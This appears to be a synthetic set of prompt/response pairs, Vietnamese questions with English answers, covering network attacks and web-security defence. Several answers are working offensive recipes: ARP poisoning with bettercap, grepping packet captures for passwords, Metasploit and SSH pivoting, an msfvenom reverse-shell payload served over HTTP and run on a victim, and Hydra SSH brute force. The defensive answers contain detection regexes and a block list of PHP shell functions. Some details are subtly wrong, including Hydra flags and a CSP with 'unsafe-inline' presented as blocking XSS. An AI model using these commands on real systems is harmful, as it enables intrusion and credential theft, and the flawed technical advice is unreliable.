prompt: ARP spoof: lan trong nội bộ, tôi muốn hiểu arpspoof hơn: tại sao nó hoạt động trên switch L2 và dấu hiệu phát hiện?
response: Switches forward by MAC tables, not IPs; ARP spoof poisons the target's ARP cache, claiming your MAC owns the gateway IP. Thereafter unicast frames addressed to the gateway go to you. Verify: `arp -a` on a victim shows the gateway mapped to your NIC's MAC, not the router's. Detection signs: duplicate IP with different MACs in `arpwatch`, abnormal unicast flooding, and IDS signatures for `ARP poisoning`. Modern mitigation: ARP-snooping bindings (DHCP), 802.1X, or static ARP entries on sensitive hosts. On the offensive side, `bettercap` with `arp.spoof` module automates targeted poisoning and clears entries on exit.

prompt: tcpdump/wireshark: phân tích dump pcap để tìm dấu vết lộ thông tin xác thực thì filter/display nào nên dùng?
response: Grep credentials efficiently: `tcpdump -r capture.pcap -A 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'` catches only POST bodies. Simpler: `tcpdump -r cap.pcap -A -s 0 port 80 | grep -iE 'password|login|token'`. In Wireshark use `http.request.method == 'POST'` then follow the TCP stream; apply `ftp || telnet || pop` for cleartext auth legs. SQLi markers: `strings cap.pcap | grep -iE 'union|select'`. Decrypt TLS if you have the session keys (`ssl.keylog_file`). Export URLs: `tshark -r cap.pcap -Y http.request -T fields -e http.host -e http.uri`. Never inspect third-party traffic without authorization.

prompt: Pivoting: đã có shell trên host nội bộ, muốn tiếp cận mạng cục bộ khác phía sau. Pivot bằng Metasploit hay SSH tunnel thế nào?
response: Create a secondary route: Metasploit `route add 10.10.10.0/24 <session_id>` then `auxiliary/scanner/portscan/tcp` against inner addresses — traffic tunnels via the meterpreter session. Best pipes: SSH dynamic SOCKS — `ssh -D 1080 user@pivot_lhost` then set Proxychains: `proxychains nmap -sT -Pn 10.10.10.0/24`. Chain SOCKS hops for deep islands: `socat TCP-LISTEN:2222,fork TCP:10.10.10.5:22`. If the target restricts outbound 22, pivot with `chisel client` (HTTP tunnelsign) using port 443. Track your routes and remember the chain lives until you kill the session.

prompt: Metasploit: hướng dẫn luồng dùng msfconsole từ tạo payload tới get shell + post-exploit trong lab.
response: 1) `msfconsole`. 2) `msfvenom -p linux/x64/shell_reverse_tcp LHOST=you LPORT=4444 -f elf -o shell.elf`. 3) `use exploit/multi/handler`; `set payload linux/x64/shell_reverse_tcp`; `set LHOST`/`LPORT`; `run -j` to background the listener. 4) Serve the payload: `python3 -m http.server 8080`, fetch and `chmod +x`, execute on victim. 5) `sessions -l`, then upgrade `sessions -u <id>`? (works for meterpreter on Linux). 6) Post-exploit: `use post/multi/gather/env`, `use post/linux/gather/hashdump`, or `getsystem`. 7) Cleanup: `meterpreter` `kill` the shell, remove artifacts and exit. Lab-only — never against production.

prompt: Hydra: brute force SSH trong lab bằng hydra với thế nào? Nêu luồng, lệnh và cách giảm tiếng ồn.
response: `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -t 4 -f` — `-t 4` limits parallelism, `-f` stops at first hit. For a known user list: `-L users.txt`. Tune timing: add `-w 5` (1s wait) and `--rate 8`. If you need protocol-specific probes: `-s 2222` for nonstandard ports, or `hydra -M targets.txt ssh` to sweep. Failback detection: some `sshd` logs the attempts — check `auth.log` to gauge Lockout thresholds; if lockout exists, rotate users slowly. Verbose discovery: `-V` to see guesses. Always against your own lab.

prompt: XSS defense: web của tôi bị XSS thường xuyên. Cách hardening output encoding và CSP đúng chỗ là sao?
response: Context-specific encoding is the fix: HTML-encode for the body (`<`), attribute-encode within quotes, JS-string encode for scripts, URL-encode in hrefs. Never build DOM with innerHTML from user input — the DXC advisory lists DOMPurify. Then CSP: `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self'` blocks external `<script>` sources. Add `X-XSS-Protection: 1; mode=block` (legacy) and HttpOnly+Secure cookies to kill the payload's cookie theft. Test with a browser dev console and automated scans for reflected inputs. Keep a documented allowlist for inline events you truly need.

prompt: WAF: WAF của tôi đang chặn payload SQLi nhưng attacker vẫn bypass. Cho cách tune rule + phát hiện bypass.
response: WAFs fail on encoding/grammar gaps. Review your rule engine: allow JSON/`application/json` body parsing same as form fields, decode URL/base64 before matching. Use 'protocol decoders' (e.g., `%2f`, double-encoding, `/**/` comments) as signatures, not blocking — attacker variants grow. Turn on anomaly scoring (e.g., OWASP CRS `paranoia_level 3`) instead of pure signature block. Add behavioral: rate, bot detection, and allowlist trusted CDN IPs. Detect bypass by replaying normalizing requests against your WAF test panel and correlating false-negatives with access logs; verify POST body gateways and multipart chunked encoding are inspected equally.

prompt: Detection: thành lập phát hiện tấn công web với những log/rule nào để thấy SQLi và RFID sớm?
response: Feed your SIEM the right logs: web access, WAF/ModSecurity audit, DB audit, and netflow. Rules worth writing: SQLi — regex `/union.*select|' or 1=1|sleep\(|benchmark\(/i` on the decoded query arg; error injection — any 500 where body matches SQL syntax; LFI/RFI — `(\.\.\/)+` or `php://` or `data:` in URI. Normalize first (URL-decode, casefold) because attackers encode. Add correlation: same source > 30 abnormal signatures / 60s triggers an alert; combine with login failure rate. Fine-tune on your app baseline to silence crawlers. Tail an ELK/Pipeline or Wazuh rule buffers.

prompt: Hardening: hardening một máy chủ web nginx+php cho pentest review — checklist ngắn là gì?
response: Patch the OS and PHP first. nginx: `server_tokens off;` remove version, disable risky modules, `ssl` with strong ciphers (`ECDHE+CHACHA20`), add `X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Referrer-Policy`. PHP: disable `display_errors` (leaks stack), set `open_basedir`, `disable_functions=exec,system,passthru,shell_exec`, session cookie `HttpOnly`+`Secure`. Limit uploads: whitelist extension + mime, random filenames. DB least-privilege: app user only CRUD on its schema. Tips from scanner: run `nikto` + `testssl.sh` afterwards and verify no `Server` leakage, no readable dotfiles (`.git/`, `.env`). Harden only the profile you own.

prompt: SQLi defense: chống SQLi bằng prepared statement vs chống XSS khác nhau thế nào? Vì sao prepared statement không hết XSS?
response: Prepared statements fix injection because the SQL is compiled with placeholders and user input travels as data, never as syntax — that's the silver bullet for SQLi. XSS is an output-encoding problem, not input-typing: the same string that's safe in a DB becomes code when interpolated into HTML/JS. So prepared statements do nothing for XSS. You need context-aware output encoding + CSP as discussed. Mistakes: building dynamic identifiers (table/column names) can't use prepared statements — validate against an allowlist. And never concatenate `ORDER BY` or `LIMIT` with user input directly.
